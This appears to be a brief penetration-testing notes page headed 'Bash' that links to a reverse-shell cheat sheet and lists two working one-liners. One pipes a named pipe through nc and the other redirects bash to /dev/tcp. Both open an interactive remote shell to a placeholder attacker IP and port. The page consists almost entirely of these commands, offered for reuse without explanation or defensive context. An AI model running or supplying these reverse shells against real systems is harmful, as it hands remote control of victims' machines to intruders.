# Bash

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" %}

```
/bin/sh -c "/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc <ip> <port>"
```

```
/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
```
